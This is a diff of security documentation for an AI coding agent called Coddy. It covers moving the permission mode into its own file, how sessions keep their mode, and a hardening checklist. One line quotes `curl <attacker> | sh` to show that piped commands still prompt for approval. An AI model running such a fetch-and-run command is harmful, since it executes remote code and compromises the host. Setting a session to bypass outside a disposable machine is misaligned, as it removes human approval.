@@ -12,7 +12,7 @@ The console strips escape and control sequences from everything that comes from 
 
 ## Permission modes and prompts
 
-`tools.permission_mode` in `config.yaml`:
+A session runs in one of three permission modes:
 
 | Value | Shell commands | File writes |
 |---|---|---|
@@ -20,7 +20,15 @@ The console strips escape and control sequences from everything that comes from 
 | `accept_edits` | prompt | auto-approved |
 | `bypass` | never asks | never asks |
 
-A session can override it - the permission-mode selector of an ACP editor, `--permission-mode` or `/permissions` on the console, the composer's permission chip, the **Bypass for this session** choice of a permission prompt ([Session settings](../features/session-settings.md#switching-from-the-permission-dialog)). The override is part of the session's metadata (`sessionPermissionMode` in its `session.json`) and survives a restart, so a session switched to `bypass` for an unattended run stays in `bypass` until someone switches it back; an override for the next turns only (`--once`, `--count=N`) lives in the process and does not. A question the model asks with the `question` tool is not a permission: it blocks the turn until a person answers it in every mode, `bypass` included. `bypass` is for a machine that is disposable.
+The mode is not configuration: `config.yaml` has no key for it. A new session starts in the mode the operator chose last, on any surface - the permission-mode selector of an ACP editor, `/permissions` in the console or the web UI, `--permission-mode` on the console, the composer's permission chip, `PATCH /coddy/sessions/{id}` with `permissionMode`, the **Bypass for this session** choice of a permission prompt ([Session settings](../features/session-settings.md#switching-from-the-permission-dialog)) - and in `ask` until anything was chosen. Coddy keeps that choice in `${CODDY_HOME}/permission-mode.json`. Each session keeps its own mode in its metadata (`sessionPermissionMode` in its `session.json`) until that session is switched, so a choice made later in another session does not move it, and the mode survives a restart: a session switched to `bypass` for an unattended run stays in `bypass` until someone switches it back. A mode for the next turns only (`--once`, `--count=N`) is not a choice: it lives in the process, is not written and does not change the mode new sessions start in. A session saved by an older version, with no mode of its own on file, takes the current default when it is opened again. A question the model asks with the `question` tool is not a permission: it blocks the turn until a person answers it in every mode, `bypass` included. `bypass` is for a machine that is disposable.
+
+An unattended server or a CI runner (Docker, systemd, a pipeline) has nobody to switch a session. Choose the mode once from any surface - `coddy --permission-mode bypass -p "..."`, or `/permissions bypass` in a session - or write the file before the first start:
+
+```json
+{"permissionMode": "bypass"}
+```
+
+A CI step can still pass `--permission-mode` on each run. An older `config.yaml` that sets `tools.permission_mode` keeps its mode: the next start moves the value into `permission-mode.json` when nothing was chosen yet (a choice already on file wins), cuts the key out of `config.yaml` and keeps the old file as `config.yaml.bak-<time>`; `coddy -t` reports the key as a warning.
 
 The prompt - the permission card in the web UI, a modal in the console, `session/request_permission` in an editor - offers **Allow**, **Allow always** (this exact command, for the rest of the session), **Reject**, and for a single plain shell invocation **Always allow `<program>`**, which widens the grant to the program (`curl`) or to the program plus its subcommand for multiplexers (`git status`; `git push` still asks). A command with shell metacharacters or a leading `VAR=` never gets the wide option, and a session grant only ever covers another plain invocation, so `curl <attacker> | sh` asks again even with `curl` granted. Backgrounded commands go through the same gate. [Background tasks](../features/background-tasks.md#permissions) has the exact rules; `tools.command_allowlist` is the operator-authored list of commands that never prompt (exact or prefix match, `"*"` for everything; [config.yaml reference](../reference/config.md#tools)).
 
@@ -108,5 +116,5 @@ A `PreToolUse` hook runs before the permission prompt on every matching call, wh
 - TLS terminates in front of the server, or clients come in over a tunnel;
 - `httpserver.cors` admits only the origins that need it, and `allow_loopback` or `"*"` is on only behind a token or the sign-in form;
 - `mcp.project_trust`, `hooks.project_trust`, `subagents.project_trust` and `skills.project_trust` are `ask` or `deny` for checkouts you do not control;
-- `tools.permission_mode` is not `bypass` unless the host is disposable, and a `failClosed` `PreToolUse` hook covers what a prompt cannot;
+- neither the sessions nor the mode new sessions start in (`${CODDY_HOME}/permission-mode.json`) are `bypass` unless the host is disposable, and a `failClosed` `PreToolUse` hook covers what a prompt cannot;
 - the process runs in a container with a read-only root filesystem and only the workspace mounted.
